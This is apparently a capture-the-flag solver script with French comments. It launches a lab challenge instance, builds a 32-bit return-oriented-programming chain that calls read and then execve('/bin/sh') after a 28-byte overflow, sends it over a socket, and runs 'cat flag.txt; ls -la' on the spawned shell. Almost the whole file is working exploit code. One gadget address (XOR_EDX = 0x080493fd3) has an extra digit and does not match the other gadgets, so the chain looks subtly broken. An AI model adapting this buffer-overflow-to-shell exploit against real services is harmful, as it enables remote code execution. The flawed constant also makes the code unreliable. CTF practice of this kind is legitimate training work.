import sys, json, re, time, socket, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r".")
from cylab2 import CyLab

cy = CyLab(delay=0.8)
cy.login()
cy.req("PUT", "/api/challenges/292/instance/?source=library")
host = port = None
for _ in range(12):
    time.sleep(2)
    st, b = cy.req("GET", "/api/challenges/292/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"([A-Za-z0-9][A-Za-z0-9.\-]*\.net)\s+`?(\d{4,5})", d.get("description") or "")
        if m:
            host, port = m.group(1), int(m.group(2))
            break
print("cible:", host, port)

EAX3 = 0x0809dae0        # mov eax, 3 ; ret
ADD2 = 0x0809da87        # add eax, 2 ; ret
ADD3 = 0x0809daa0        # add eax, 3 ; ret
POP_EBX = 0x0804901e
POP_ECX = 0x08049a31
POP_EDX_EBX_ESI = 0x0805848e
INT80 = 0x0805e4b0       # int 0x80 ; ret
XOR_EDX = 0x080493fd3    # xor edx,edx ; add esp,0x10 ; mov ebx,eax ; ret
BSS = 0x080e5000


def p32(x):
    return struct.pack("<I", x)


c = b""
c += p32(EAX3)                       # read
c += p32(POP_EBX) + p32(0)
c += p32(POP_ECX) + p32(BSS)
c += p32(POP_EDX_EBX_ESI) + p32(8) + p32(0) + p32(0)
c += p32(INT80)
c += p32(XOR_EDX) + p32(0) * 4       # edx = 0
c += p32(EAX3) + p32(ADD2) + p32(ADD3) + p32(ADD3)   # eax = 3+2+3+3 = 11
c += p32(POP_EBX) + p32(BSS)
c += p32(POP_ECX) + p32(0)
c += p32(INT80)                      # execve(bss,0,0)

payload = b"A" * 28 + c
print("payload:", len(payload), "| contient 0x0a:", b"\n" in payload)
if b"\n" in payload:
    for i in range(0, len(payload), 4):
        if b"\n" in payload[i:i+4]:
            print("  bloc fautif a l'offset", i, payload[i:i+4].hex())
s = socket.create_connection((host, port), timeout=15)
s.settimeout(6)
time.sleep(0.4)
try:
    s.recv(4096)
except Exception:
    pass
s.sendall(payload + b"\n")
time.sleep(0.3)
s.sendall(b"/bin/sh\x00")
time.sleep(0.5)
s.sendall(b"cat flag.txt; ls -la\n")
time.sleep(1.0)
out = b""
t0 = time.time()
while time.time() - t0 < 8:
    try:
        c2 = s.recv(8192)
        if not c2:
            break
        out += c2
    except socket.timeout:
        break
s.close()
txt = out.decode("latin-1", "replace")
print("=== reponse ===")
print(txt[:900])
f = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
print("FLAG:", f.group(0) if f else None)
